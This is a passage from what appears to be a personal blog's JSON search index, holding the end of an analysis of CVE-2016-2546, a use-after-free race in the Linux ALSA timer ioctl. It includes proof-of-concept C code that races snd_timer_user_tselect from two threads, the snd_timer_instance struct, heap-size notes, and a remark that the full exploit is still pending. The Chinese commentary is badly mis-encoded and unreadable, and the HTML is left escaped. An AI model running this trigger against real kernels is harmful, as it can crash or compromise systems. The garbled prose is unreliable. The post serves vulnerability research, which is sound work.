IOCTL_INIT(fd); /*test for create clock*/ IOCTL_INFO(fd); IOCTL_INIT(fd); // for(int i = 0; i \u0026lt; 10; i ++) // IOCTL_START(fd); printf(\u0026#34;[+] prepare to racing\\n\u0026#34;); sleep(2); pthread_t t1, t2; pthread_create(\u0026amp;t1, NULL, thread_tselect1, \u0026amp;fd); pthread_create(\u0026amp;t2, NULL, thread_tselect2, \u0026amp;fd); printf(\u0026#34;[+] threads create already\\n\u0026#34;); pthread_join(t1, NULL); pthread_join(t2, NULL); printf(\u0026#34;[+] racing condition...\\n\u0026#34;); // // Select dev // IOCTL_SELECT(fd); // IOCTL_PARAMS(fd); return 0; } gitä¿®å¤æ–¹æ¡ˆ éå¸¸æš´åŠ›åœ°ç»™æ•´ä¸ªioctlä¸Šäº†é”â€¦\nåˆ©ç”¨ ç°åœ¨æˆ‘ä»¬çŸ¥é“ï¼Œsnd_timer_user_tselect å‡½æ•°ä¼šé€ æˆtimer instance çš„UAF\nç»“æ„ä½“\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 struct snd_timer_instance { struct snd_timer *timer; char *owner; unsigned int flags; void *private_data; void (*private_free) (struct snd_timer_instance *ti); void (*callback) (struct snd_timer_instance *timeri, unsigned long ticks, unsigned long resolution); void (*ccallback) (struct snd_timer_instance * timeri, int event, struct timespec * tstamp, unsigned long resolution); void *callback_data; unsigned long ticks;\t/* auto-load ticks when expired */ unsigned long cticks;\t/* current ticks */ unsigned long pticks;\t/* accumulated ticks for callback */ unsigned long resolution;\t/* current resolution for tasklet */ unsigned long lost;\t/* lost ticks */ int slave_class; unsigned int slave_id; struct list_head open_list; struct list_head active_list; struct list_head ack_list; struct list_head slave_list_head; struct list_head slave_active_head; struct snd_timer_instance *master; }; ioctlè‡ªå¸¦çš„å‡½æ•°å¹¶æ²¡æœ‰å¤§é‡å¯¹timer_instance çš„æ“ä½œï¼Œéš¾ä»¥leak\ntimer_instance ç»“æ„ä½“æ€»å¤§å°0xccï¼Œå¯¹åº”slab allocation kmalloc-256\næ„Ÿè§‰æ¯”è¾ƒéº»çƒ¦ï¼Œå®Œæ•´åˆ©ç”¨æ€è·¯å¾…è¡¥å……â€¦\nå‚è€ƒé“¾æ¥ https://www.kernel.org/doc/html/latest/sound/utimers.html\nhttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=af368027a49a751d6ff4ee9e3f9961f35bb4fede\n","date":"2024-12-08T16:03:57+08:00","permalink":"https://hkbinbin.github.io/p/cve-2016-2546%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2016-2546æ¼æ´åˆ†æ"},{"content":"It is begin!\n","date":"2024-11-25T17:09:22+08:00","permalink":"https://hkbinbin.github.io/p/test/","title":"Test"}]